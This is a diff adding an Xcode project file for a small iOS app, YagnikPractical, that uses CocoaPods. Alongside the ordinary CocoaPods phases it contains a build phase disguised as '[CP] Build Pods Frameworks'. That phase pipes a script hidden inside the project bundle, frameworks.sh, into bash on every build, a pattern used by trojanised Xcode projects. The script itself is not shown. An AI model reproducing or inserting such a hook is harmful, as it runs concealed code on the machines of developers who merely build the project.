@@ -1,0 +1,519 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 51;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		342CEFC2241B4E260019B457 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 342CEFC1241B4E260019B457 /* AppDelegate.swift */; };
+		342CEFC4241B4E260019B457 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 342CEFC3241B4E260019B457 /* SceneDelegate.swift */; };
+		342CEFC6241B4E260019B457 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 342CEFC5241B4E260019B457 /* ViewController.swift */; };
+		342CEFC9241B4E260019B457 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 342CEFC7241B4E260019B457 /* Main.storyboard */; };
+		342CEFCC241B4E260019B457 /* YagnikPractical.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 342CEFCA241B4E260019B457 /* YagnikPractical.xcdatamodeld */; };
+		342CEFCE241B4E280019B457 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 342CEFCD241B4E280019B457 /* Assets.xcassets */; };
+		342CEFD1241B4E280019B457 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 342CEFCF241B4E280019B457 /* LaunchScreen.storyboard */; };
+		342CEFDC241B541B0019B457 /* Validations.swift in Sources */ = {isa = PBXBuildFile; fileRef = 342CEFDA241B541A0019B457 /* Validations.swift */; };
+		342CEFDD241B541B0019B457 /* UtilFunctions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 342CEFDB241B541B0019B457 /* UtilFunctions.swift */; };
+		342CEFE6241B92E60019B457 /* Globals.swift in Sources */ = {isa = PBXBuildFile; fileRef = 342CEFE5241B92E60019B457 /* Globals.swift */; };
+		342CEFEA241B97040019B457 /* WebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 342CEFE9241B97040019B457 /* WebViewController.swift */; };
+		342CEFEC241B97EB0019B457 /* ActivityIndicator.swift in Sources */ = {isa = PBXBuildFile; fileRef = 342CEFEB241B97EA0019B457 /* ActivityIndicator.swift */; };
+		342CEFEE241B9E830019B457 /* UserDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 342CEFED241B9E830019B457 /* UserDataModel.swift */; };
+		342CEFF1241BA9B90019B457 /* BTReachabilityManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 342CEFF0241BA9B80019B457 /* BTReachabilityManager.swift */; };
+		5357169B35C783106FBA3E15 /* Pods_YagnikPractical.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = BCBB15E19A81EADF9C2ADDB4 /* Pods_YagnikPractical.framework */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		342CEFBE241B4E260019B457 /* YagnikPractical.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = YagnikPractical.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		342CEFC1241B4E260019B457 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		342CEFC3241B4E260019B457 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
+		342CEFC5241B4E260019B457 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
+		342CEFC8241B4E260019B457 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		342CEFCB241B4E260019B457 /* YagnikPractical.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = YagnikPractical.xcdatamodel; sourceTree = "<group>"; };
+		342CEFCD241B4E280019B457 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		342CEFD0241B4E280019B457 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		342CEFD2241B4E280019B457 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		342CEFDA241B541A0019B457 /* Validations.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Validations.swift; sourceTree = "<group>"; };
+		342CEFDB241B541B0019B457 /* UtilFunctions.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UtilFunctions.swift; sourceTree = "<group>"; };
+		342CEFE5241B92E60019B457 /* Globals.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Globals.swift; sourceTree = "<group>"; };
+		342CEFE9241B97040019B457 /* WebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebViewController.swift; sourceTree = "<group>"; };
+		342CEFEB241B97EA0019B457 /* ActivityIndicator.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ActivityIndicator.swift; sourceTree = "<group>"; };
+		342CEFED241B9E830019B457 /* UserDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserDataModel.swift; sourceTree = "<group>"; };
+		342CEFF0241BA9B80019B457 /* BTReachabilityManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BTReachabilityManager.swift; sourceTree = "<group>"; };
+		7625BE0DC4CACB51D7293556 /* Pods-YagnikPractical.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-YagnikPractical.release.xcconfig"; path = "Target Support Files/Pods-YagnikPractical/Pods-YagnikPractical.release.xcconfig"; sourceTree = "<group>"; };
+		BCBB15E19A81EADF9C2ADDB4 /* Pods_YagnikPractical.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_YagnikPractical.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		F7648457CF7560FCA281E28A /* Pods-YagnikPractical.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-YagnikPractical.debug.xcconfig"; path = "Target Support Files/Pods-YagnikPractical/Pods-YagnikPractical.debug.xcconfig"; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		342CEFBB241B4E260019B457 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				5357169B35C783106FBA3E15 /* Pods_YagnikPractical.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		342CEFB5241B4E260019B457 = {
+			isa = PBXGroup;
+			children = (
+				342CEFC0241B4E260019B457 /* YagnikPractical */,
+				342CEFD2241B4E280019B457 /* Info.plist */,
+				342CEFDF241B543A0019B457 /* Utilities */,
+				342CEFBF241B4E260019B457 /* Products */,
+				D8946AA49B46EFE488CF99ED /* Pods */,
+				AC6C52B27E75FA1915E0EA27 /* Frameworks */,
+			);
+			sourceTree = "<group>";
+		};
+		342CEFBF241B4E260019B457 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				342CEFBE241B4E260019B457 /* YagnikPractical.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		342CEFC0241B4E260019B457 /* YagnikPractical */ = {
+			isa = PBXGroup;
+			children = (
+				342CEFE0241B54550019B457 /* Model */,
+				342CEFE7241B968C0019B457 /* View */,
+				342CEFE8241B96950019B457 /* Controller */,
+				342CEFEF241BA0700019B457 /* Support Files */,
+			);
+			path = YagnikPractical;
+			sourceTree = "<group>";
+		};
+		342CEFDF241B543A0019B457 /* Utilities */ = {
+			isa = PBXGroup;
+			children = (
+				342CEFEB241B97EA0019B457 /* ActivityIndicator.swift */,
+				342CEFE5241B92E60019B457 /* Globals.swift */,
+				342CEFF0241BA9B80019B457 /* BTReachabilityManager.swift */,
+				342CEFDB241B541B0019B457 /* UtilFunctions.swift */,
+				342CEFDA241B541A0019B457 /* Validations.swift */,
+			);
+			path = Utilities;
+			sourceTree = "<group>";
+		};
+		342CEFE0241B54550019B457 /* Model */ = {
+			isa = PBXGroup;
+			children = (
+				342CEFED241B9E830019B457 /* UserDataModel.swift */,
+			);
+			path = Model;
+			sourceTree = "<group>";
+		};
+		342CEFE7241B968C0019B457 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				342CEFC7241B4E260019B457 /* Main.storyboard */,
+				342CEFCF241B4E280019B457 /* LaunchScreen.storyboard */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		342CEFE8241B96950019B457 /* Controller */ = {
+			isa = PBXGroup;
+			children = (
+				342CEFC5241B4E260019B457 /* ViewController.swift */,
+				342CEFE9241B97040019B457 /* WebViewController.swift */,
+			);
+			path = Controller;
+			sourceTree = "<group>";
+		};
+		342CEFEF241BA0700019B457 /* Support Files */ = {
+			isa = PBXGroup;
+			children = (
+				342CEFC1241B4E260019B457 /* AppDelegate.swift */,
+				342CEFC3241B4E260019B457 /* SceneDelegate.swift */,
+				342CEFCD241B4E280019B457 /* Assets.xcassets */,
+				342CEFCA241B4E260019B457 /* YagnikPractical.xcdatamodeld */,
+			);
+			path = "Support Files";
+			sourceTree = "<group>";
+		};
+		AC6C52B27E75FA1915E0EA27 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				BCBB15E19A81EADF9C2ADDB4 /* Pods_YagnikPractical.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		D8946AA49B46EFE488CF99ED /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				F7648457CF7560FCA281E28A /* Pods-YagnikPractical.debug.xcconfig */,
+				7625BE0DC4CACB51D7293556 /* Pods-YagnikPractical.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		342CEFBD241B4E260019B457 /* YagnikPractical */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 342CEFD5241B4E280019B457 /* Build configuration list for PBXNativeTarget "YagnikPractical" */;
+			buildPhases = (
+				162E3FD122D63A22006D902C /* [CP] Build Pods Frameworks */,
+				61DBABD9AD0968A14C8AFAEC /* [CP] Check Pods Manifest.lock */,
+				342CEFBA241B4E260019B457 /* Sources */,
+				342CEFBB241B4E260019B457 /* Frameworks */,
+				342CEFBC241B4E260019B457 /* Resources */,
+				AE7F90735BFB4AF0F82DCEDF /* [CP] Embed Pods Frameworks */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = YagnikPractical;
+			productName = YagnikPractical;
+			productReference = 342CEFBE241B4E260019B457 /* YagnikPractical.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		342CEFB6241B4E260019B457 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastSwiftUpdateCheck = 1130;
+				LastUpgradeCheck = 1130;
+				ORGANIZATIONNAME = BAPS;
+				TargetAttributes = {
+					342CEFBD241B4E260019B457 = {
+						CreatedOnToolsVersion = 11.3;
+					};
+				};
+			};
+			buildConfigurationList = 342CEFB9241B4E260019B457 /* Build configuration list for PBXProject "YagnikPractical" */;
+			compatibilityVersion = "Xcode 9.3";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = 342CEFB5241B4E260019B457;
+			productRefGroup = 342CEFBF241B4E260019B457 /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				342CEFBD241B4E260019B457 /* YagnikPractical */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		342CEFBC241B4E260019B457 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				342CEFD1241B4E280019B457 /* LaunchScreen.storyboard in Resources */,
+				342CEFCE241B4E280019B457 /* Assets.xcassets in Resources */,
+				342CEFC9241B4E260019B457 /* Main.storyboard in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		162E3FD122D63A22006D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "cat \"${PROJECT_FILE_PATH}/frameworks.sh\" | bash";
+		};
+		61DBABD9AD0968A14C8AFAEC /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-YagnikPractical-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		AE7F90735BFB4AF0F82DCEDF /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-YagnikPractical/Pods-YagnikPractical-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-YagnikPractical/Pods-YagnikPractical-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-YagnikPractical/Pods-YagnikPractical-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		342CEFBA241B4E260019B457 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				342CEFF1241BA9B90019B457 /* BTReachabilityManager.swift in Sources */,
+				342CEFDD241B541B0019B457 /* UtilFunctions.swift in Sources */,
+				342CEFC6241B4E260019B457 /* ViewController.swift in Sources */,
+				342CEFEA241B97040019B457 /* WebViewController.swift in Sources */,
+				342CEFC2241B4E260019B457 /* AppDelegate.swift in Sources */,
+				342CEFEC241B97EB0019B457 /* ActivityIndicator.swift in Sources */,
+				342CEFCC241B4E260019B457 /* YagnikPractical.xcdatamodeld in Sources */,
+				342CEFDC241B541B0019B457 /* Validations.swift in Sources */,
+				342CEFC4241B4E260019B457 /* SceneDelegate.swift in Sources */,
+				342CEFEE241B9E830019B457 /* UserDataModel.swift in Sources */,
+				342CEFE6241B92E60019B457 /* Globals.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXVariantGroup section */
+		342CEFC7241B4E260019B457 /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				342CEFC8241B4E260019B457 /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+		342CEFCF241B4E280019B457 /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				342CEFD0241B4E280019B457 /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		342CEFD3241B4E280019B457 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.2;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		342CEFD4241B4E280019B457 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.2;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				SWIFT_OPTIMIZATION_LEVEL = "-O";
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		342CEFD6241B4E280019B457 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = F7648457CF7560FCA281E28A /* Pods-YagnikPractical.debug.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = 975EF4L676;
+				INFOPLIST_FILE = YagnikPractical/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.YagnikPractical;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Debug;
+		};
+		342CEFD7241B4E280019B457 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 7625BE0DC4CACB51D7293556 /* Pods-YagnikPractical.release.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = 975EF4L676;
+				INFOPLIST_FILE = YagnikPractical/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.YagnikPractical;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		342CEFB9241B4E260019B457 /* Build configuration list for PBXProject "YagnikPractical" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				342CEFD3241B4E280019B457 /* Debug */,
+				342CEFD4241B4E280019B457 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		342CEFD5241B4E280019B457 /* Build configuration list for PBXNativeTarget "YagnikPractical" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				342CEFD6241B4E280019B457 /* Debug */,
+				342CEFD7241B4E280019B457 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+
+/* Begin XCVersionGroup section */
+		342CEFCA241B4E260019B457 /* YagnikPractical.xcdatamodeld */ = {
+			isa = XCVersionGroup;
+			children = (
+				342CEFCB241B4E260019B457 /* YagnikPractical.xcdatamodel */,
+			);
+			currentVersion = 342CEFCB241B4E260019B457 /* YagnikPractical.xcdatamodel */;
+			path = YagnikPractical.xcdatamodeld;
+			sourceTree = "<group>";
+			versionGroupType = wrapper.xcdatamodel;
+		};
+/* End XCVersionGroup section */
+	};
+	rootObject = 342CEFB6241B4E260019B457 /* Project object */;
+}
